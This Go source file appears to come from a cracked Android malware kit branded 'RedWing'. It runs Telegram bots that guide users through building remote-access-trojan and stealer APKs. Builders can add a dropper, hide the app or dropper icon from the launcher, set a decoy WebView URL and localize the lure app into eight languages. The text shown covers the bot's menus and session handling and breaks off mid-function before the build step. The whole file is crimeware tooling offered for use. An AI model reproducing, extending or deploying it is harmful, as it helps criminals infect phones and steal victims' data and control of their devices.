package builder

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"image"
	_ "image/jpeg"
	"image/png"
	"io"
	"log"
	mrand "math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	xdraw "golang.org/x/image/draw"
	"golang.org/x/crypto/chacha20"

	"redwing/internal/db"
)

var GetSetting func(teamID, key string) string

type Bot struct {
	botToken string
	teamName string
	teamID   string
	serverIP string
	baseDir  string
	stopCh   chan struct{}

	sessions   map[int64]*BuildSession
	sessionsMu sync.Mutex
}

var (
	runningBots   = map[string]*Bot{}
	runningBotsMu sync.Mutex

	defaultServerAddr string
	defaultBaseDir    string
)

func Init(server, workspaceDir string) {
	defaultServerAddr = server
	defaultBaseDir = workspaceDir
}

func StartBot(token, team, server, workspaceDir, tid string) {
	runningBotsMu.Lock()
	defer runningBotsMu.Unlock()

	if server != "" {
		defaultServerAddr = server
	}
	if workspaceDir != "" {
		defaultBaseDir = workspaceDir
	}
	if server == "" {
		server = defaultServerAddr
	}
	if workspaceDir == "" {
		workspaceDir = defaultBaseDir
	}

	if existing, ok := runningBots[tid]; ok {
		close(existing.stopCh)
		delete(runningBots, tid)
	}

	if token == "" {
		log.Printf("[BUILDER] No bot token for team %s, builder bot disabled", tid)
		return
	}

	bot := &Bot{
		botToken: token,
		teamName: team,
		teamID:   tid,
		serverIP: server,
		baseDir:  workspaceDir,
		stopCh:   make(chan struct{}),
		sessions: make(map[int64]*BuildSession),
	}
	runningBots[tid] = bot
	log.Printf("[BUILDER] Starting bot for team %s, server=%s", tid, server)
	go bot.run()
}

func StopBot(tid string) {
	runningBotsMu.Lock()
	defer runningBotsMu.Unlock()
	if bot, ok := runningBots[tid]; ok {
		close(bot.stopCh)
		delete(runningBots, tid)
	}
}

func RestartBot(tid, token string) {
	runningBotsMu.Lock()
	existing := runningBots[tid]
	runningBotsMu.Unlock()

	var team, server, base string
	if existing != nil {
		team = existing.teamName
		server = existing.serverIP
		base = existing.baseDir
	}
	if server == "" {
		server = defaultServerAddr
	}
	if base == "" {
		base = defaultBaseDir
	}
	if team == "" {
		var name string
		db.DB.QueryRow("SELECT COALESCE(name,'') FROM teams WHERE id = ?", tid).Scan(&name)
		if name != "" {
			team = name
		} else {
			team = "RedWing Team"
		}
	}
	StartBot(token, team, server, base, tid)
}

func StartAll(server, workspaceDir string) {
	if GetSetting == nil {
		return
	}
	rows, err := db.DB.Query("SELECT DISTINCT team_id FROM team_settings WHERE key = 'builder_bot_token' AND value != ''")
	if err != nil {
		return
	}
	defer rows.Close()

	usedTokens := map[string]bool{}
	runningBotsMu.Lock()
	for _, bot := range runningBots {
		usedTokens[bot.botToken] = true
	}
	runningBotsMu.Unlock()

	for rows.Next() {
		var tid string
		rows.Scan(&tid)
		token := GetSetting(tid, "builder_bot_token")
		if token == "" || usedTokens[token] {
			continue
		}
		usedTokens[token] = true
		label := tid
		if len(label) > 8 {
			label = label[:8]
		}
		StartBot(token, "Team "+label, server, workspaceDir, tid)
	}
}

func (b *Bot) run() {
	b.tgAPI("deleteWebhook", map[string]any{"drop_pending_updates": false})

	me, err := b.tgAPI("getMe", map[string]any{})
	if err != nil {
		log.Printf("[BUILDER] ERROR: getMe failed: %v — check your token", err)
		return
	}
	if result, ok := me["result"].(map[string]any); ok {
		log.Printf("[BUILDER] Bot: @%s (%s) — polling started", result["username"], result["first_name"])
	} else {
		log.Printf("[BUILDER] ERROR: getMe returned unexpected result")
		return
	}

	var offset int64
	errCount := 0
	for {
		select {
		case <-b.stopCh:
			log.Println("[BUILDER] Polling stopped")
			return
		default:
		}

		updates, err := b.getUpdates(offset)
		if err != nil {
			errCount++
			log.Printf("[BUILDER] getUpdates error (#%d): %v", errCount, err)
			wait := time.Duration(errCount) * time.Second
			if errCount > 5 {
				wait = 30 * time.Second
			}
			select {
			case <-b.stopCh:
				log.Println("[BUILDER] Polling stopped")
				return
			case <-time.After(wait):
			}
			continue
		}
		errCount = 0

		for _, upd := range updates {
			offset = upd.UpdateID + 1
			go b.handleUpdate(upd)
		}
	}
}

type langStrings struct {
	Welcome         string
	ChooseType      string
	StealerAPK      string
	RatAPK          string
	InDevelopment   string
	Step1Name       string
	Step1Prompt     string
	Step1Warn1      string
	Step1Warn2      string
	Back            string
	Step2Icon       string
	Step2Prompt     string
	Skip            string
	IconReceived    string
	Step3Dropper    string
	WithDropper     string
	WithoutDropper  string
	Step4Lang       string
	LangRU          string
	LangEN          string
	LangTR          string
	LangDE          string
	LangFR          string
	LangES          string
	LangPT          string
	LangAR          string
	Step5Settings   string
	HideIcon        string
	ShowIcon        string
	StartBuild      string
	BuildStarted    string
	BuildComplete   string
	BuildTime       string
	BuildSize       string
	InvalidName     string
	DropperSettings string
	DropperVisible  string
	DropperHidden   string
	HideDropperIcon string
	ShowDropperIcon string
	RatIconVisible  string
	RatIconHidden   string
	OnlyRatNow     string
	NoDropperNow   string
	ChooseLang     string
}

var langs = map[string]langStrings{
	"ru": {
		Welcome:         "👋 RedWing cracked by @omnibotnet\n\n👥 Команда: %s\n\n⚡ Выбери тип сборки:",
		ChooseType:      "⚡ Выбери тип сборки:",
		StealerAPK:      "Stealer APK",
		RatAPK:          "RAT APK",
		InDevelopment:   "🚧 В разработке",
		Step1Name:       "📝 Шаг 1/5: Название",
		Step1Prompt:     "Введите название приложения",
		Step1Warn1:      "⚠️ Максимум 70 символов",
		Step1Warn2:      "⚠️ Рекомендуются латинские символы (English)",
		Back:            "Назад",
		Step2Icon:       "🖼 Шаг 2/5: Иконка",
		Step2Prompt:     "Отправьте изображение для иконки\nРекомендуемый размер: 512x512",
		Skip:            "Пропустить",
		IconReceived:    "✅ Иконка получена!",
		Step3Dropper:    "📦 Шаг 3/5: Дроппер",
		WithDropper:     "С дроппером",
		WithoutDropper:  "Без дроппера",
		Step4Lang:       "🌐 Шаг 4/5: Язык приложения",
		LangRU:          "🇷🇺 Русский",
		LangEN:          "🇺🇸 English",
		LangTR:          "🇹🇷 Türkçe",
		LangDE:          "🇩🇪 Deutsch",
		LangFR:          "🇫🇷 Français",
		LangES:          "🇪🇸 Español",
		LangPT:          "🇧🇷 Português",
		LangAR:          "🇸🇦 العربية",
		Step5Settings:   "⚙️ Шаг 5/5: Настройки",
		HideIcon:        "❌ Скрыть иконку",
		ShowIcon:        "✅ Показать иконку",
		StartBuild:      "Начать сборку",
		BuildStarted:    "🚀 Запуск сборки...",
		BuildComplete:   "✅ Сборка завершена",
		BuildTime:       "⏱ %d сек",
		BuildSize:       "📁 %.1f MB",
		InvalidName:     "❌ Неверное имя. Максимум 70 символов.",
		DropperSettings: "📦 Дроппер",
		DropperVisible:  "📦 Иконка дроппера: видна",
		DropperHidden:   "📦 Иконка дроппера: скрыта",
		HideDropperIcon: "❌ Скрыть иконку дроппера",
		ShowDropperIcon: "✅ Показать иконку дроппера",
		RatIconVisible:  "🖼 Иконка: видна в лаунчере",
		RatIconHidden:   "🖼 Иконка: скрыта из лаунчера",
		OnlyRatNow:     "⚠️ Сейчас доступна только сборка RAT APK.\nStealer APK в разработке.",
		NoDropperNow:   "⚠️ Сборка с дроппером в разработке.\nАвтоматически выбрана сборка без дроппера.",
		ChooseLang:     "🌐 Выбери язык / Choose language:",
	},
	"en": {
		Welcome:         "👋 RedWing cracked by @omnibotnet\n\n👥 Team: %s\n\n⚡ Choose build type:",
		ChooseType:      "⚡ Choose build type:",
		StealerAPK:      "Stealer APK",
		RatAPK:          "RAT APK",
		InDevelopment:   "🚧 In development",
		Step1Name:       "📝 Step 1/5: Name",
		Step1Prompt:     "Enter application name",
		Step1Warn1:      "⚠️ Maximum 70 characters",
		Step1Warn2:      "⚠️ Latin characters recommended (English)",
		Back:            "Back",
		Step2Icon:       "🖼 Step 2/5: Icon",
		Step2Prompt:     "Send an image for the icon\nRecommended size: 512x512",
		Skip:            "Skip",
		IconReceived:    "✅ Icon received!",
		Step3Dropper:    "📦 Step 3/5: Dropper",
		WithDropper:     "With dropper",
		WithoutDropper:  "Without dropper",
		Step4Lang:       "🌐 Step 4/5: App language",
		LangRU:          "🇷🇺 Русский",
		LangEN:          "🇺🇸 English",
		LangTR:          "🇹🇷 Türkçe",
		LangDE:          "🇩🇪 Deutsch",
		LangFR:          "🇫🇷 Français",
		LangES:          "🇪🇸 Español",
		LangPT:          "🇧🇷 Português",
		LangAR:          "🇸🇦 العربية",
		Step5Settings:   "⚙️ Step 5/5: Settings",
		HideIcon:        "❌ Hide app icon",
		ShowIcon:        "✅ Show app icon",
		StartBuild:      "Start build",
		BuildStarted:    "🚀 Starting build...",
		BuildComplete:   "✅ Build complete",
		BuildTime:       "⏱ %d sec",
		BuildSize:       "📁 %.1f MB",
		InvalidName:     "❌ Invalid name. Maximum 70 characters.",
		DropperSettings: "📦 Dropper",
		DropperVisible:  "📦 Dropper icon: visible",
		DropperHidden:   "📦 Dropper icon: hidden",
		HideDropperIcon: "❌ Hide dropper icon",
		ShowDropperIcon: "✅ Show dropper icon",
		RatIconVisible:  "🖼 Icon: visible in launcher",
		RatIconHidden:   "🖼 Icon: hidden from launcher",
		OnlyRatNow:     "⚠️ Only RAT APK build is available now.\nStealer APK is in development.",
		NoDropperNow:   "⚠️ Dropper build is in development.\nAutomatically selected build without dropper.",
		ChooseLang:     "🌐 Выбери язык / Choose language:",
	},
}

type BuildSession struct {
	mu             sync.Mutex
	State          string
	BotLang        string
	BuildType      string
	AppName        string
	IconFileID     string
	UseDropper     bool
	HideDropperIco bool
	HideIcon       bool
	AppLang        string
	GeneratedPkg   string
	WebViewURL     string
}

func (b *Bot) getSession(userID int64) *BuildSession {
	b.sessionsMu.Lock()
	defer b.sessionsMu.Unlock()
	s, ok := b.sessions[userID]
	if !ok {
		s = &BuildSession{State: "lang_select", BotLang: "ru"}
		b.sessions[userID] = s
	}
	return s
}

func (b *Bot) L(userID int64, key string) string {
	sess := b.getSession(userID)
	lang := langs[sess.BotLang]
	switch key {
	case "welcome":
		return fmt.Sprintf(lang.Welcome, b.teamName)
	case "choose_type":
		return lang.ChooseType
	case "stealer_apk":
		return lang.StealerAPK
	case "rat_apk":
		return lang.RatAPK
	case "in_development":
		return lang.InDevelopment
	case "step1_name":
		return lang.Step1Name
	case "step1_prompt":
		return lang.Step1Prompt
	case "step1_warn1":
		return lang.Step1Warn1
	case "step1_warn2":
		return lang.Step1Warn2
	case "back":
		return lang.Back
	case "step2_icon":
		return lang.Step2Icon
	case "step2_prompt":
		return lang.Step2Prompt
	case "skip":
		return lang.Skip
	case "icon_received":
		return lang.IconReceived
	case "step3_dropper":
		return lang.Step3Dropper
	case "with_dropper":
		return lang.WithDropper
	case "without_dropper":
		return lang.WithoutDropper
	case "step4_lang":
		return lang.Step4Lang
	case "lang_ru":
		return lang.LangRU
	case "lang_en":
		return lang.LangEN
	case "lang_tr":
		return lang.LangTR
	case "lang_de":
		return lang.LangDE
	case "lang_fr":
		return lang.LangFR
	case "lang_es":
		return lang.LangES
	case "lang_pt":
		return lang.LangPT
	case "lang_ar":
		return lang.LangAR
	case "step5_settings":
		return lang.Step5Settings
	case "hide_icon":
		return lang.HideIcon
	case "show_icon":
		return lang.ShowIcon
	case "start_build":
		return lang.StartBuild
	case "build_started":
		return lang.BuildStarted
	case "build_complete":
		return lang.BuildComplete
	case "build_time":
		return lang.BuildTime
	case "build_size":
		return lang.BuildSize
	case "invalid_name":
		return lang.InvalidName
	case "dropper_settings":
		return lang.DropperSettings
	case "dropper_visible":
		return lang.DropperVisible
	case "dropper_hidden":
		return lang.DropperHidden
	case "hide_dropper_icon":
		return lang.HideDropperIcon
	case "show_dropper_icon":
		return lang.ShowDropperIcon
	case "rat_icon_visible":
		return lang.RatIconVisible
	case "rat_icon_hidden":
		return lang.RatIconHidden
	case "only_rat_now":
		return lang.OnlyRatNow
	case "no_dropper_now":
		return lang.NoDropperNow
	case "choose_lang":
		return lang.ChooseLang
	}
	return key
}

type TgUpdate struct {
	UpdateID      int64       `json:"update_id"`
	Message       *TgMessage  `json:"message"`
	CallbackQuery *TgCallback `json:"callback_query"`
}
type TgMessage struct {
	MessageID int64       `json:"message_id"`
	From      *TgUser     `json:"from"`
	Chat      *TgChat     `json:"chat"`
	Text      string      `json:"text"`
	Photo     []TgPhoto   `json:"photo"`
	Document  *TgDocument `json:"document"`
}
type TgCallback struct {
	ID      string     `json:"id"`
	From    *TgUser    `json:"from"`
	Message *TgMessage `json:"message"`
	Data    string     `json:"data"`
}
type TgUser struct {
	ID        int64  `json:"id"`
	FirstName string `json:"first_name"`
	Username  string `json:"username"`
}
type TgChat struct{ ID int64 `json:"id"` }
type TgPhoto struct {
	FileID string `json:"file_id"`
	Width  int    `json:"width"`
	Height int    `json:"height"`
}
type TgDocument struct {
	FileID   string `json:"file_id"`
	MimeType string `json:"mime_type"`
}

var longPollClient = &http.Client{Timeout: 60 * time.Second}

func (b *Bot) tgAPI(method string, params map[string]any) (map[string]any, error) {
	body, _ := json.Marshal(params)
	resp, err := http.Post(
		fmt.Sprintf("https://api.telegram.org/bot%s/%s", b.botToken, method),
		"application/json",
		bytes.NewReader(body),
	)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var result map[string]any
	json.NewDecoder(resp.Body).Decode(&result)
	return result, nil
}

func (b *Bot) getUpdates(offset int64) ([]TgUpdate, error) {
	body, _ := json.Marshal(map[string]any{
		"offset":          offset,
		"timeout":         30,
		"allowed_updates": []string{"message", "callback_query"},
	})
	resp, err := longPollClient.Post(
		fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates", b.botToken),
		"application/json",
		bytes.NewReader(body),
	)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)

	var raw struct {
		OK          bool       `json:"ok"`
		Description string     `json:"description"`
		Result      []TgUpdate `json:"result"`
	}
	if err := json.Unmarshal(respBody, &raw); err != nil {
		return nil, fmt.Errorf("json decode: %v", err)
	}
	if !raw.OK {
		return nil, fmt.Errorf("telegram: %s", raw.Description)
	}
	return raw.Result, nil
}

func (b *Bot) sendMessage(chatID int64, text string, keyboard any) {
	params := map[string]any{"chat_id": chatID, "text": text, "parse_mode": "HTML"}
	if keyboard != nil {
		params["reply_markup"] = keyboard
	}
	b.tgAPI("sendMessage", params)
}

func (b *Bot) answerCallback(callbackID, text string) {
	b.tgAPI("answerCallbackQuery", map[string]any{"callback_query_id": callbackID, "text": text})
}

func (b *Bot) editMessage(chatID int64, messageID int64, text string, keyboard any) {
	params := map[string]any{"chat_id": chatID, "message_id": messageID, "text": text, "parse_mode": "HTML"}
	if keyboard != nil {
		params["reply_markup"] = keyboard
	}
	b.tgAPI("editMessageText", params)
}

func inlineKeyboard(rows ...[]map[string]string) map[string]any {
	var kb [][]map[string]string
	kb = append(kb, rows...)
	return map[string]any{"inline_keyboard": kb}
}

func btn(text, data string) map[string]string {
	return map[string]string{"text": text, "callback_data": data}
}

func replyKeyboard(rows ...[]string) map[string]any {
	var kb [][]map[string]string
	for _, row := range rows {
		var btns []map[string]string
		for _, t := range row {
			btns = append(btns, map[string]string{"text": t})
		}
		kb = append(kb, btns)
	}
	return map[string]any{"keyboard": kb, "resize_keyboard": true, "one_time_keyboard": true}
}

func removeKeyboard() map[string]any {
	return map[string]any{"remove_keyboard": true}
}

func (b *Bot) sendDocument(chatID int64, filename string, data []byte) {
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", fmt.Sprintf("%d", chatID))
	part, _ := w.CreateFormFile("document", filename)
	part.Write(data)
	w.Close()
	resp, err := http.Post(
		fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", b.botToken),
		w.FormDataContentType(), &buf,
	)
	if err != nil {
		log.Printf("[BUILDER] sendDocument error: %v", err)
		return
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)
}

func (b *Bot) getSubSettings() (channelID, checkToken, channelURL string, isPrivate bool) {
	if GetSetting == nil || b.teamID == "" {
		return
	}
	channelID = GetSetting(b.teamID, "builder_required_channel_id")
	checkToken = GetSetting(b.teamID, "subscription_check_bot_token")
	channelURL = GetSetting(b.teamID, "builder_channel_url")
	isPrivate = GetSetting(b.teamID, "builder_channel_private") == "true"
	return
}

func normalizeChannelID(id string) string {
	id = strings.TrimSpace(id)
	if id == "" {
		return id
	}
	if !strings.HasPrefix(id, "-") {
		id = "-100" + id
	} else if !strings.HasPrefix(id, "-100") {
		id = "-100" + strings.TrimPrefix(id, "-")
	}
	return id
}

func (b *Bot) checkSubscription(userID int64) bool {
	channelID, checkToken, _, _ := b.getSubSettings()
	if channelID == "" || checkToken == "" {
		return true
	}

	channelID = normalizeChannelID(channelID)

	url := fmt.Sprintf("https://api.telegram.org/bot%s/getChatMember?chat_id=%s&user_id=%d",
		checkToken, channelID, userID)
	resp, err := http.Get(url)
	if err != nil {
		log.Printf("[BUILDER] subscription check network error: %v", err)
		return true
	}
	defer resp.Body.Close()

	var result struct {
		OK          bool   `json:"ok"`
		Description string `json:"description"`
		Result      struct {
			Status string `json:"status"`
		} `json:"result"`
	}
	if json.NewDecoder(resp.Body).Decode(&result) != nil {
		return true
	}
	if !result.OK {
		log.Printf("[BUILDER] subscription check API error: %s", result.Description)
		return false
	}

	switch result.Result.Status {
	case "creator", "administrator", "member":
		return true
	default:
		return false
	}
}

func (b *Bot) sendSubscribeMessage(chatID, userID int64) {
	channelID, checkToken, channelURL, isPrivate := b.getSubSettings()
	if channelID == "" {
		return
	}

	sess := b.getSession(userID)
	lang := langs[sess.BotLang]
	_ = lang

	if channelURL == "" && isPrivate && checkToken != "" {
		body, _ := json.Marshal(map[string]any{
			"chat_id":              normalizeChannelID(channelID),
			"member_limit":         1,
			"creates_join_request": false,
		})
		resp, err := http.Post(
			fmt.Sprintf("https://api.telegram.org/bot%s/createChatInviteLink", checkToken),
			"application/json", bytes.NewReader(body),
		)
		if err == nil {
			defer resp.Body.Close()
			var r struct {
				OK     bool `json:"ok"`
				Result struct {
					InviteLink string `json:"invite_link"`
				} `json:"result"`
			}
			if json.NewDecoder(resp.Body).Decode(&r) == nil && r.OK && r.Result.InviteLink != "" {
				channelURL = r.Result.InviteLink
			}
		}
	}

	var subText, btnText string
	if sess.BotLang == "ru" {
		subText = "❌ Для использования билдера необходимо подписаться на канал."
		btnText = "📢 Подписаться"
	} else {
		subText = "❌ You must subscribe to the channel to use the builder."
		btnText = "📢 Subscribe"
	}

	var rows [][]map[string]string
	if channelURL != "" {
		rows = append(rows, []map[string]string{{"text": btnText, "url": channelURL}})
	}
	if sess.BotLang == "ru" {
		rows = append(rows, []map[string]string{btn("🔄 Проверить подписку", "check_sub")})
	} else {
		rows = append(rows, []map[string]string{btn("🔄 Check subscription", "check_sub")})
	}

	b.sendMessage(chatID, subText, map[string]any{"inline_keyboard": rows})
}

func (b *Bot) handleUpdate(upd TgUpdate) {
	if upd.CallbackQuery != nil {
		b.handleCallback(upd.CallbackQuery)
		return
	}
	if upd.Message != nil {
		b.handleMessage(upd.Message)
	}
}

func (b *Bot) handleMessage(msg *TgMessage) {
	if msg.From == nil || msg.Chat == nil {
		return
	}
	userID := msg.From.ID
	chatID := msg.Chat.ID
	sess := b.getSession(userID)
	sess.mu.Lock()
	defer sess.mu.Unlock()

	text := strings.TrimSpace(msg.Text)

	if text == "/start" {
		sess.State = "lang_select"
		b.sendMessage(chatID, langs["ru"].ChooseLang, inlineKeyboard(
			[]map[string]string{btn("🇷🇺 Русский", "botlang_ru"), btn("🇺🇸 English", "botlang_en")},
		))
		return
	}

	if !b.checkSubscription(userID) {
		b.sendSubscribeMessage(chatID, userID)
		return
	}

	switch sess.State {
	case "name":
		if text == b.L(userID, "back") {
			sess.State = "type_select"
			b.sendBuildTypeMenu(chatID, userID)
			return
		}
		if len(text) == 0 || len(text) > 70 {
			b.sendMessage(chatID, b.L(userID, "invalid_name"), nil)
			return
		}
		sess.AppName = text
		sess.State = "icon"
		b.sendIconStep(chatID, userID, sess)

	case "icon":
		if text == b.L(userID, "back") {
			sess.State = "name"
			b.sendNameStep(chatID, userID)
			return
		}
		iconReceived := false
		if len(msg.Photo) > 0 {
			sess.IconFileID = msg.Photo[len(msg.Photo)-1].FileID
			iconReceived = true
		} else if msg.Document != nil && strings.HasPrefix(msg.Document.MimeType, "image/") {
			sess.IconFileID = msg.Document.FileID
			iconReceived = true
		}
		if iconReceived {
			b.sendMessage(chatID, b.L(userID, "icon_received"), nil)
			if sess.BuildType == "stealer" {
				sess.State = "stealer_lang"
				b.sendStealerLangStep(chatID, userID)
			} else {
				sess.State = "dropper"
				b.sendDropperStep(chatID, userID)
			}
			return
		}
		b.sendMessage(chatID, b.L(userID, "step2_prompt"), nil)

	case "stealer_webview":
		if text == b.L(userID, "back") {
			sess.State = "stealer_lang"
			b.sendStealerLangStep(chatID, userID)
			return
		}
		if !strings.HasPrefix(text, "http://") && !strings.HasPrefix(text, "https://") {
			text = "https://" + text
		}
		sess.WebViewURL = text
		sess.State = "settings"
		b.sendSettingsStep(chatID, userID, sess)
	}
}

func (b *Bot) handleCallback(cb *TgCallback) {
	if cb.From == nil {
		return
	}
	userID := cb.From.ID
	chatID := cb.Message.Chat.ID
	sess := b.getSession(userID)
	sess.mu.Lock()
	defer sess.mu.Unlock()

	data := cb.Data

	if data == "check_sub" {
		if b.checkSubscription(userID) {
			if sess.BotLang == "ru" {
				b.answerCallback(cb.ID, "✅ Подписка подтверждена!")
			} else {
				b.answerCallback(cb.ID, "✅ Subscription confirmed!")
			}
			sess.State = "type_select"
			b.editMessage(chatID, cb.Message.MessageID, b.L(userID, "welcome"), inlineKeyboard(
				[]map[string]string{btn(b.L(userID, "stealer_apk"), "type_stealer")},
				[]map[string]string{btn(b.L(userID, "rat_apk"), "type_rat")},
			))
		} else {
			if sess.BotLang == "ru" {
				b.answerCallback(cb.ID, "❌ Вы не подписаны на канал")
			} else {
				b.answerCallback(cb.ID, "❌ You are not subscribed")
			}
		}
		return
	}

	if !b.checkSubscription(userID) {
		b.answerCallback(cb.ID, "")
		b.sendSubscribeMessage(chatID, userID)
		return
	}

	switch {
	case data == "botlang_ru" || data == "botlang_en":
		sess.BotLang = strings.TrimPrefix(data, "botlang_")
		sess.State = "type_select"
		b.answerCallback(cb.ID, "")
		b.editMessage(chatID, cb.Message.MessageID, b.L(userID, "welcome"), inlineKeyboard(
			[]map[string]string{btn(b.L(userID, "stealer_apk"), "type_stealer")},
			[]map[string]string{btn(b.L(userID, "rat_apk"), "type_rat")},
		))

	case data == "type_stealer":
		sess.BuildType = "stealer"
		sess.State = "name"
		b.answerCallback(cb.ID, "")
		b.sendNameStep(chatID, userID)

	case data == "type_rat":
		sess.BuildType = "rat"
		sess.State = "name"
		b.answerCallback(cb.ID, "")
		b.sendNameStep(chatID, userID)

	case data == "dropper_yes":
		sess.UseDropper = true
		sess.State = "app_lang"
		b.answerCallback(cb.ID, "")
		b.sendAppLangStep(chatID, userID)

	case data == "dropper_no":
		sess.UseDropper = false
		sess.HideDropperIco = false
		sess.State = "app_lang"
		b.answerCallback(cb.ID, "")
		b.sendAppLangStep(chatID, userID)

	case strings.HasPrefix(data, "applang_"):
		sess.AppLang = strings.TrimPrefix(data, "applang_")
		b.answerCallback(cb.ID, "")
		sess.State = "settings"
		b.sendSettingsStep(chatID, userID, sess)

	case strings.HasPrefix(data, "stealer_lang_"):
		sess.AppLang = strings.TrimPrefix(data, "stealer_lang_")
		b.answerCallback(cb.ID, "")
		sess.State = "stealer_webview"
		b.sendStealerWebviewStep(chatID, userID)

	case data == "back_to_stealer_lang":
		sess.State = "stealer_lang"
		b.answerCallback(cb.ID, "")
		b.sendStealerLangStep(chatID, userID)

	case data == "back_to_stealer_webview":
		sess.State = "stealer_webview"
		b.answerCallback(cb.ID, "")
		b.sendStealerWebviewStep(chatID, userID)

	case data == "back_to_icon":
		sess.State = "icon"
		b.answerCallback(cb.ID, "")
		b.sendIconStep(chatID, userID, sess)

	case data == "back_to_dropper":
		sess.State = "dropper"
		b.answerCallback(cb.ID, "")
		b.sendDropperStep(chatID, userID)

	case data == "back_to_lang":
		sess.State = "app_lang"
		b.answerCallback(cb.ID, "")
		b.sendAppLangStep(chatID, userID)

	case data == "toggle_rat_icon":
		sess.HideIcon = !sess.HideIcon
		b.answerCallback(cb.ID, "")
		text, kb := b.buildSettingsUI(userID, sess)
		b.editMessage(chatID, cb.Message.MessageID, text, kb)

	case data == "toggle_dropper_icon":
		sess.HideDropperIco = !sess.HideDropperIco
		b.answerCallback(cb.ID, "")
		text, kb := b.buildSettingsUI(userID, sess)
		b.editMessage(chatID, cb.Message.MessageID, text, kb)

	case data == "start_build":
		b.answerCallback(cb.ID, "")
		sess.State = "building"
		go b.buildAPK(chatID, userID, sess)
	}
}

func (b *Bot) sendBuildTypeMenu(chatID int64, userID int64) {
	b.sendMessage(chatID, b.L(userID, "welcome"), inlineKeyboard(
		[]map[string]string{btn(b.L(userID, "stealer_apk"), "type_stealer")},
		[]map[string]string{btn(b.L(userID, "rat_apk"), "type_rat")},
	))
}

func (b *Bot) sendNameStep(chatID int64, userID int64) {
	text := fmt.Sprintf("%s\n\n<blockquote>%s\n%s\n%s</blockquote>",
		b.L(userID, "step1_name"), b.L(userID, "step1_prompt"), b.L(userID, "step1_warn1"), b.L(userID, "step1_warn2"))
	b.sendMessage(chatID, text, replyKeyboard([]string{b.L(userID, "back")}))
}

func (b *Bot) sendIconStep(chatID int64, userID int64, sess *BuildSession) {
	text := fmt.Sprintf("✅ Название: <b>%s</b>\n\n%s\n\n<blockquote>%s</blockquote>",
		sess.AppName, b.L(userID, "step2_icon"), b.L(userID, "step2_prompt"))
	b.sendMessage(chatID, text, replyKeyboard([]string{b.L(userID, "back")}))
}

func (b *Bot) sendAppLangStep(chatID int64, userID int64) {
	b.sendMessage(chatID, b.L(userID, "step4_lang"), inlineKeyboard(
		[]map[string]string{btn(b.L(userID, "lang_ru"), "applang_ru"), btn(b.L(userID, "lang_en"), "applang_en")},
		[]map[string]string{btn(b.L(userID, "lang_tr"), "applang_tr"), btn(b.L(userID, "lang_de"), "applang_de")},
		[]map[string]string{btn(b.L(userID, "lang_fr"), "applang_fr"), btn(b.L(userID, "lang_es"), "applang_es")},
		[]map[string]string{btn(b.L(userID, "lang_pt"), "applang_pt"), btn(b.L(userID, "lang_ar"), "applang_ar")},
		[]map[string]string{btn(b.L(userID, "back"), "back_to_dropper")},
	))
}

func (b *Bot) sendStealerLangStep(chatID int64, userID int64) {
	var text string
	if b.getSession(userID).BotLang == "ru" {
		text = "⚙️ Шаг 3/5: Язык приложения\n\nВыберите язык интерфейса стиллера:"
	} else {
		text = "⚙️ Step 3/5: App language\n\nChoose stealer interface language:"
	}
	b.sendMessage(chatID, text, inlineKeyboard(
		[]map[string]string{btn(b.L(userID, "lang_ru"), "stealer_lang_ru"), btn(b.L(userID, "lang_en"), "stealer_lang_en")},
		[]map[string]string{btn(b.L(userID, "lang_tr"), "stealer_lang_tr"), btn(b.L(userID, "lang_de"), "stealer_lang_de")},
		[]map[string]string{btn(b.L(userID, "lang_fr"), "stealer_lang_fr"), btn(b.L(userID, "lang_es"), "stealer_lang_es")},
		[]map[string]string{btn(b.L(userID, "lang_pt"), "stealer_lang_pt"), btn(b.L(userID, "lang_ar"), "stealer_lang_ar")},
		[]map[string]string{btn(b.L(userID, "back"), "back_to_icon")},
	))
}

func (b *Bot) sendStealerWebviewStep(chatID int64, userID int64) {
	var text string
	if b.getSession(userID).BotLang == "ru" {
		text = "⚙️ Шаг 4/5: WebView URL\n\nОтправьте URL, который будет отображаться в WebView приложения.\n\n<blockquote>По умолчанию: https://www.google.com</blockquote>"
	} else {
		text = "⚙️ Step 4/5: WebView URL\n\nSend the URL to be displayed in the app's WebView.\n\n<blockquote>Default: https://www.google.com</blockquote>"
	}
	b.sendMessage(chatID, text, replyKeyboard([]string{b.L(userID, "back")}))
}

func (b *Bot) sendDropperStep(chatID int64, userID int64) {
	b.sendMessage(chatID, b.L(userID, "step3_dropper"), inlineKeyboard(
		[]map[string]string{btn(b.L(userID, "with_dropper"), "dropper_yes")},
		[]map[string]string{btn(b.L(userID, "without_dropper"), "dropper_no")},
		[]map[string]string{btn(b.L(userID, "back"), "back_to_icon")},
	))
}

func (b *Bot) buildSettingsUI(userID int64, sess *BuildSession) (string, map[string]any) {
	var lines []string
	var rows [][]map[string]string

	if sess.HideIcon {
		lines = append(lines, b.L(userID, "rat_icon_hidden"))
		rows = append(rows, []map[string]string{btn(b.L(userID, "show_icon"), "toggle_rat_icon")})
	} else {
		lines = append(lines, b.L(userID, "rat_icon_visible"))
		rows = append(rows, []map[string]string{btn(b.L(userID, "hide_icon"), "toggle_rat_icon")})
	}

	if sess.UseDropper {
		if sess.HideDropperIco {
			lines = append(lines, b.L(userID, "dropper_hidden"))
			rows = append(rows, []map[string]string{btn(b.L(userID, "show_dropper_icon"), "toggle_dropper_icon")})
		} else {
			lines = append(lines, b.L(userID, "dropper_visible"))
			rows = append(rows, []map[string]string{btn(b.L(userID, "hide_dropper_icon"), "toggle_dropper_icon")})
		}
	}

	if sess.BuildType == "stealer" {
		langFlags := map[string]string{
			"ru": "🇷🇺 Русский", "en": "🇺🇸 English", "tr": "🇹🇷 Türkçe", "de": "🇩🇪 Deutsch",
			"fr": "🇫🇷 Français", "es": "🇪🇸 Español", "pt": "🇧🇷 Português", "ar": "🇸🇦 العربية",
		}
		langLabel := langFlags[sess.AppLang]
		if langLabel == "" {
			langLabel = "🇺🇸 English"
		}
		lines = append(lines, "🌐 "+langLabel)

